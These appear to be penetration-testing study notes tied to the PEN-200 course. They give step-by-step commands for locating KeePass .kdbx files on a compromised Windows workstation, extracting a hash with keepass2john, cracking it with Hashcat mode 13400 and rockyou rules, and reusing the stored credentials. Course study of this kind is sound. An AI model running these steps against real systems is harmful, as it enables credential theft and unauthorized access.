# KeePass Database Cracking

Use this when you gain access to a Windows workstation and discover KeePass or a `.kdbx` database.

## 1. Find KeePass databases

```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

Transfer the discovered `.kdbx` file to Kali.

## 2. Convert the database to a crackable hash

```bash
keepass2john Database.kdbx > keepass.hash
cat keepass.hash
```

The PEN-200 example prepends the filename (`Database:`). For Hashcat, remove that prefix so the line begins with the KeePass hash material.

## 3. Identify the Hashcat mode

```bash
hashcat --help | grep -i 'KeePass'
```

Chapter 13 uses:

```text
13400 = KeePass 1 (AES/Twofish) and KeePass 2 (AES)
```

## 4. Crack with a targeted rule set

```bash
hashcat -m 13400 keepass.hash \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/rockyou-30000.rule
```

## 5. Use the recovered master password

Open the database and inventory **all stored credentials**, then map each credential to its likely host/service before reuse.

## Quick chain

```text
workstation access
  → find *.kdbx
  → exfiltrate database
  → keepass2john
  → remove filename prefix if needed
  → Hashcat mode 13400 + rules
  → master password
  → stored credentials
```
